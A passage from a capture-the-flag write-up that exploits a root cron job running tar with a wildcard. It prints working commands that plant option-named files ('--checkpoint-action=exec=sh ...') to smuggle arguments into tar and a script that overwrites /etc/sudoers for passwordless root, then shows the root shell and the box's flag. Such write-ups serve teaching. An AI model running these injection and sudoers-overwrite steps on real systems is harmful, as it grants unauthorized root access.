PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin  
  
# m h dom mon dow user command  
17 * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly  
25 6 * * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )  
47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )  
52 6 1 * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )  
*/2 * * * root cd /home/andre/backup &amp;&amp; tar -zcf /tmp/andre_backup.tar.gz *
</code></pre></div></div>

<p><strong>Why</strong> is this a <strong>Wildcard Injection</strong> vulnerability?</p>

<p>The <strong>last entry</strong> of the <strong>output</strong> of our <strong>cat</strong> tells us that:
Every <strong>2 minutes</strong>, via the <strong>root</strong> user, <strong>ALL</strong> (indicated by <strong>asterisk</strong>) the files in the <strong>/home/andre/backup</strong> folder are compressed into a <strong>tar</strong>, which is then sent to the <strong>/tmp/</strong> directory</p>

<p>We can exploit this and obtain <strong>root</strong> privilege by inserting some <strong>malicious code</strong> here that will <strong>remove the need for the andre user to provide a password when running the sudo program</strong>. This code will be executed by our <strong>cron</strong>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>andre@cmess:~/backup$ echo 'echo "andre ALL=(root) NOPASSWD: ALL" &gt; /etc/sudoers' &gt; safeprogram.sh  
andre@cmess:~/backup$ echo "" &gt; "--checkpoint-action=exec=sh safeprogram.sh"  
andre@cmess:~/backup$ echo "" &gt; --checkpoint=1
andre@cmess:~/backup$ ls -l  
total 16  
-rw-rw-r-- 1 andre andre 1 Jun 1 07:59 --checkpoint=1  
-rw-rw-rw-- 1 andre andre 1 Jun 1 07:59 --checkpoint-action=exec=sh safeprogram.sh  
-rwxr-x--- 1 andre andre 51 Feb 9 2020 note  
-rw-rw-r-- 1 andre andre 53 Jun 1 07:58 safeprogram.sh
</code></pre></div></div>

<p>After two minutes, this is the return from our <strong>sudo -l</strong>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>andre@cmess:~/backup$ sudo -l  
User andre may run the following commands on cmess:  
   (root) NOPASSWD: ALL
</code></pre></div></div>

<p>And from that we get <strong>root</strong> without even entering the password:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>andre@cmess:~/backup$ sudo bash  
root@cmess:~/backup#
</code></pre></div></div>

<p>In the <strong>/root</strong> folder we find our <strong>second flag</strong>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@cmess:~/backup# cd /root  
root@cmess:/root# ls  
root.txt  
root@cmess:/root# cat root.txt    
thm{9f85b7fdeb2cf96985bf5761a93546a2}  
root@cmess:/root#
</code></pre></div></div>]]></content><author><name>Rubick</name></author><category term="writeup" /><summary type="html"><![CDATA[]]></summary></entry></feed>